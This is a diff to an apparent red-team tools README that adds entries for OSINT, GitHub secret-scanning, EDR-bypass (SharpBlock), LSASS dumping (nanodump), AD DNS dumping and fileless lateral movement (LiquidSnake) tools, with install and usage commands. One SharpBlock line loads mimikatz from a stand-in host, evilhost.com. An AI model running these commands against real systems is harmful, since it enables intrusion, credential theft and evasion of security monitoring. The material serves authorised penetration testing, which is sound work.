@@ -23,7 +23,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 # Tool List
 
 <details open>
-    <summary><b>Reconnaissance</b> $\textcolor{gray}{\text{15 tools}}$</summary>
+    <summary><b>Reconnaissance</b> $\textcolor{gray}{\text{17 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#crtsh---httprobe---eyewitness">crt.sh -> httprobe -> EyeWitness</a></b><i> Automated domain screenshotting</i></li>
@@ -41,6 +41,8 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#dismap">Dismap</a></b><i> Asset discovery/identification</i></li>
             <li><b><a href="#enum4linux">enum4linux</a></b><i> Windows/samba enumeration</i></li>
             <li><b><a href="#skanuvaty">skanuvaty</a></b><i> Dangerously fast dns/network/port scanner</i></li>
+            <li><b><a href="#metabigor">Metabigor</a></b><i> OSINT tool without API</i></li>
+            <li><b><a href="#gitrob">Gitrob</a></b><i> GitHub sensitive information scanner</i></li>
         </ul>
     </ul>
 </details>
@@ -116,48 +118,52 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{2 tools}}$</summary>
+    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{3 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#invoke-obfuscation">Invoke-Obfuscation</a></b><i> Script obfuscator</i></li>
-	    <li><b><a href="#veil">Veil</a></b><i> Metasploit payload obfuscator</i></li>
+	        <li><b><a href="#veil">Veil</a></b><i> Metasploit payload obfuscator</i></li>
+            <li><b><a href="#sharpblock">SharpBlock</a></b><i> EDR bypass via entry point execution prevention</i></li>
         </ul>
     </ul>
 </details>
 
 <details open>
-    <summary><b>Credential Access</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <summary><b>Credential Access</b> $\textcolor{gray}{\text{6 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#mimikatz">Mimikatz</a></b><i> Windows credential extractor</i></li>
             <li><b><a href="#lazagne">LaZagne</a></b><i> Local password extractor</i></li>
             <li><b><a href="#hashcat">hashcat</a></b><i> Password hash cracking</i></li>
             <li><b><a href="#john-the-ripper">John the Ripper</a></b><i> Password hash cracking</i></li>
-	    <li><b><a href="#scomdecrypt">SCOMDecrypt</a></b><i> SCOM Credential Decryption Tool</i></li>
+	        <li><b><a href="#scomdecrypt">SCOMDecrypt</a></b><i> SCOM Credential Decryption Tool</i></li>
+	        <li><b><a href="#nanodump">nanodump</a></b><i> LSASS process minidump creation</i></li>
         </ul>
     </ul>
 </details>
 
 <details open>
-    <summary><b>Discovery</b> $\textcolor{gray}{\text{4 tools}}$</summary>
+    <summary><b>Discovery</b> $\textcolor{gray}{\text{5 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#pcredz">PCredz</a></b><i> Credential discovery PCAP/live interface</i></li>
             <li><b><a href="#pingcastle">PingCastle</a></b><i> Active directory assessor</i></li>
-	    <li><b><a href="#seatbelt">Seatbelt</a></b><i> Local vulnerability scanner</i></li>
-	    <li><b><a href="#adrecon">ADRecon</a></b><i> Active directory recon</i></li>
+    	    <li><b><a href="#seatbelt">Seatbelt</a></b><i> Local vulnerability scanner</i></li>
+    	    <li><b><a href="#adrecon">ADRecon</a></b><i> Active directory recon</i></li>
+    	    <li><b><a href="#adidnsdump">adidnsdump</a></b><i> Active Directory Integrated DNS dumping</i></li>
         </ul>
     </ul>
 </details>
 
 <details open>
-    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{8 tools}}$</summary>
+    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{9 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#crackmapexec">crackmapexec</a></b><i> Windows/Active directory lateral movement toolkit</i></li>
             <li><b><a href="#wmiops">WMIOps</a></b><i> WMI remote commands</i></li>
             <li><b><a href="#powerlessshell">PowerLessShell</a></b><i> Remote PowerShell without PowerShell</i></li>
             <li><b><a href="#psexec">PsExec</a></b><i> Light-weight telnet-replacement</i></li>
+            <li><b><a href="#liquidsnake">LiquidSnake</a></b><i> Fileless lateral movement</i></li>
             <li><b><a href="#enabling-rdp">Enabling RDP</a></b><i> Windows RDP enable command</i></li>
             <li><b><a href="#upgrading-shell-to-meterpreter">Upgrading shell to meterpreter</a></b><i> Reverse shell improvement</i></li>
             <li><b><a href="#forwarding-ports">Forwarding Ports</a></b><i> Local port forward command</i></li>
@@ -565,6 +571,87 @@ skanuvaty --target example.com --concurrency 16 --subdomains-file SUBDOMAIN_WORD
 ![image](https://user-images.githubusercontent.com/100603074/210856146-42a4015c-f34b-4dc6-9e9b-cbeb4a43a964.png)
 
 *Image used from https://github.com/Esc4iCEscEsc/skanuvaty*
+
+### [🔙](#tool-list)[Metabigor](https://github.com/j3ssie/metabigor)
+
+Metabigor is Intelligence tool, its goal is to do OSINT tasks and more but without any API key.
+
+**Main Features:**
+
+- Searching information about IP Address, ASN and Organization.
+- Wrapper for running rustscan, masscan and nmap more efficient on IP/CIDR.
+- Finding more related domains of the target by applying various techniques (certificate, whois, Google Analytics, etc).
+- Get Summary about IP address (powered by [@thebl4ckturtle](https://github.com/theblackturtle))
+
+**Install:** 
+
+```bash
+go install github.com/j3ssie/metabigor@latest
+```
+
+**Usage:** 
+
+```bash
+# discovery IP of a company/organization
+echo "company" | metabigor net --org -o /tmp/result.txt
+
+# Getting more related domains by searching for certificate info
+echo 'Target Inc' | metabigor cert --json | jq -r '.Domain' | unfurl format %r.%t | sort -u # this is old command
+
+# Only run rustscan with full ports
+echo '1.2.3.4/24' | metabigor scan -o result.txt
+
+# Reverse Whois to find related domains
+echo 'example.com' | metabigor related -s 'whois'
+
+# Get Google Analytics ID directly from the URL
+echo 'https://example.com' | metabigor related -s 'google-analytic'
+```
+
+![image](https://user-images.githubusercontent.com/100603074/210982590-44d58bfc-3b1b-4e11-b8f3-58c5a517626d.png)
+
+*Image used from https://github.com/j3ssie/metabigor*
+
+### [🔙](#tool-list)[Gitrob](https://github.com/michenriksen/gitrob)
+
+Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. 
+
+Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files. 
+
+The findings will be presented through a web interface for easy browsing and analysis.
+
+**Note:** *Gitrob will need a Github access token in order to interact with the Github API. [Create a personal access token](https://help.github.com/articles/creating-a-personal-access-token-for-the-command-line/) and save it in an environment variable in your .bashrc or similar shell configuration file:*
+
+```bash
+export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+```
+
+**Install: (Go)** 
+
+```bash
+go get github.com/michenriksen/gitrob
+```
+
+**Install: (Binary)** 
+
+A [precompiled version](https://github.com/michenriksen/gitrob/releases) is available for each release.
+
+**Usage:** 
+
+```bash
+# Run against org
+gitrob {org_name}
+
+# Saving session to a file
+gitrob -save ~/gitrob-session.json acmecorp
+
+# Loading session from a file
+gitrob -load ~/gitrob-session.json
+```
+
+![image](https://user-images.githubusercontent.com/100603074/210982754-fb70db8f-0e0f-4c31-962f-ac89edc7e64a.png)
+
+*Image used from https://www.uedbox.com/post/58828/*
 
 Resource Development
 ====================
@@ -1574,6 +1661,43 @@ Veil creators wrote a nice [blog post](https://www.veil-framework.com/veil-comma
 
 ![image](https://user-images.githubusercontent.com/100603074/210136422-6b17671f-8868-4747-a7fe-e75d36b99e61.png)
 
+### [🔙](#tool-list)[SharpBlock](https://github.com/CCob/SharpBlock)
+
+A method of bypassing EDR's active projection DLL's by preventing entry point execution.
+
+**Features:**
+
+- Blocks EDR DLL entry point execution, which prevents EDR hooks from being placed.
+- Patchless AMSI bypass that is undetectable from scanners looking for Amsi.dll code patches at runtime.
+- Host process that is replaced with an implant PE that can be loaded from disk, HTTP or named pipe (Cobalt Strike).
+- Implanted process is hidden to help evade scanners looking for hollowed processes.
+- Command line args are spoofed and implanted after process creation using stealthy EDR detection method.
+- Patchless ETW bypass.
+- Blocks NtProtectVirtualMemory invocation when callee is within the range of a blocked DLL's address space.
+
+**Install:** 
+
+Use [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/) to compile the SharpBlock binary.
+
+Open the SharpBlock [project .sln](https://github.com/CCob/SharpBlock), choose "Release", and build.
+
+**Usage:** 
+
+```bash
+# Launch mimikatz over HTTP using notepad as the host process, blocking SylantStrike's DLL
+SharpBlock -e http://evilhost.com/mimikatz.bin -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee
+
+# Launch mimikatz using Cobalt Strike beacon over named pipe using notepad as the host process, blocking SylantStrike's DLL
+execute-assembly SharpBlock.exe -e \\.\pipe\mimi -s c:\windows\system32\notepad.exe -d "Active Protection DLL for SylantStrike" -a coffee
+upload_file /home/haxor/mimikatz.exe \\.\pipe\mimi
+```
+
+Nice PenTestPartners blog post [here](https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/).
+
+![image](https://user-images.githubusercontent.com/100603074/210983524-d6ea4255-7c47-45bb-8b13-9f6240735b0e.png)
+
+*Image used from https://youtu.be/0W9wkamknfM*
+
 Credential Access
 ====================
 
@@ -1704,6 +1828,57 @@ Invoke-SCOMDecrypt
 
 *Image text used from https://github.com/nccgroup/SCOMDecrypt*
 
+### [🔙](#tool-list)[nanodump](https://github.com/helpsystems/nanodump)
+
+The LSASS (Local Security Authority Subsystem Service) is a system process in the Windows operating system that is responsible for enforcing the security policy on the system. It is responsible for a number of tasks related to security, including authenticating users for logon, enforcing security policies, and generating audit logs.
+
+Creating a dump of this process can allow an attacker to extract password hashes or other sensitive information from the process's memory, which could be used to compromise the system further.
+
+This allows for the creation of a minidump of the LSASS process.
+
+**Install:** 
+
+```bash
+git clone https://github.com/helpsystems/nanodump.git
+```
+
+**Install: (Linux with MinGW)** 
+
+```bash
+make -f Makefile.mingw
+```
+
+**Install: (Windows with MSVC)** 
+
+```bash
+nmake -f Makefile.msvc
+```
+
+**Install: (CobaltStrike only)**
+
+Import the `NanoDump.cna` script on Cobalt Strike.
+
+Full installation information can be found [here](https://github.com/helpsystems/nanodump).
+
+**Usage:** 
+
+```bash
+# Run
+nanodump.x64.exe
+
+# Leverage the Silent Process Exit technique
+nanodump --silent-process-exit C:\Windows\Temp\
+
+# Leverage the Shtinkering technique
+nanodump --shtinkering
+```
+
+Full usage information can be found [here](https://github.com/helpsystems/nanodump#1-usage).
+
+![nanodump](https://user-images.githubusercontent.com/100603074/210985548-a5e69f62-04da-4771-b06b-720147de08d0.jpg)
+
+*Image used from https://github.com/helpsystems/nanodump*
+
 Discovery
 ====================
 
@@ -1827,6 +2002,47 @@ Full usage and parameter information can be found [here](https://github.com/sens
 ![image](https://user-images.githubusercontent.com/100603074/210137064-2a0247b3-5d28-409a-904b-0fd9db87ef56.png)
 
 *Image used from https://vk9-sec.com/domain-enumeration-powerview-adrecon/*
+
+### [🔙](#tool-list)[adidnsdump](https://github.com/dirkjanm/adidnsdump)
+
+By default any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer. 
+
+This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks.
+
+**Install: (Pip)** 
+
+```bash
+pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
+```
+
+**Install: (Git)** 
+
+```bash
+git clone https://github.com/dirkjanm/adidnsdump
+cd adidnsdump
+pip install .
+```
+
+**Note:** *The tool requires `impacket` and `dnspython` to function. While the tool works with both Python 2 and 3, Python 3 support requires you to install [impacket from GitHub](https://github.com/CoreSecurity/impacket).*
+
+**Usage:** 
+
+```bash
+# Display the zones in the domain where you are currently in
+adidnsdump -u icorp\\testuser --print-zones icorp-dc.internal.corp
+
+# Display all zones in the domain
+adidnsdump -u icorp\\testuser icorp-dc.internal.corp
+
+# Resolve all unknown records (-r)
+adidnsdump -u icorp\\testuser icorp-dc.internal.corp -r
+```
+
+[Blog - Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+
+![adidnsdump](https://user-images.githubusercontent.com/100603074/210986363-724e6611-12e9-4a0d-abfa-c44665010b97.jpg)
+
+*Image used from https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/*
 
 Lateral Movement
 ====================
@@ -1963,6 +2179,53 @@ Great [blog post](https://adamtheautomator.com/psexec/) on PsExec usage.
 ![image](https://user-images.githubusercontent.com/100603074/210266376-8daa51d6-16d4-4422-b723-d1bc8b7f22e2.png)
 
 *Image used from https://adamtheautomator.com/psexec/*
+
+### [🔙](#tool-list)[LiquidSnake](https://github.com/RiccardoAncarani/LiquidSnake)
+
+Liquid Snake is a program aimed at performing lateral movement against Windows systems without touching the disk. 
+
+The tool relies on WMI Event Subscription in order to execute a .NET assembly in memory, the .NET assembly will listen for a shellcode on a named pipe and then execute it using a variation of the thread hijacking shellcode injection.
+
+The project is composed by two separate solutions:
+
+- `CSharpNamedPipeLoader` - the component that will be transformed in VBS via GadgetToJScript
+- `LiquidSnake` - the component responsible to creating the WMI Event Subscription on the remote system
+
+**Install:** 
+
+Open both solutions in Visual Studio and build. *Make sure to target x64 architecture for the `CSharpNamedPipeLoader`.*
+
+Output: Two separate EXEs: `CSharpNamedPipeLoader.exe` and `LiquidSnake.exe`
+
+Full build information can be found [here](https://github.com/RiccardoAncarani/LiquidSnake#building).
+
+**Usage:** 
+
+Use `LiquidSnake.exe` agains a host where you have administrative access over as follows:
+
+```bash
+LiquidSnake.exe <host> [<username> <password> <domain>]
+LiquidSnake.exe dc01.isengard.local
+LiquidSnake.exe dc01.isengard.local saruman DeathToFrodo123 isengard.local
+```
+
+If everything went fine, you should obtain an output similar as the following:
+
+```bash
+[*] Event filter created.
+[*] Event consumer created.
+[*] Subscription created, now sleeping
+[*] Sending some DCOM love..
+[*] Sleeping again... long day
+```
+
+General usage information can be found [here](https://github.com/RiccardoAncarani/LiquidSnake#usage).
+
+Full `LiquidSnake` usage information can be found [here](https://github.com/RiccardoAncarani/LiquidSnake/tree/main/LiquidSnake).
+
+![LiquidSnake](https://user-images.githubusercontent.com/100603074/210986763-2ffe49dd-597b-4ca2-a3ad-674b5fe39624.jpg)
+
+*Image used from https://github.com/RiccardoAncarani/LiquidSnake#usage*
 
 ### [🔙](#tool-list)Enabling RDP
 
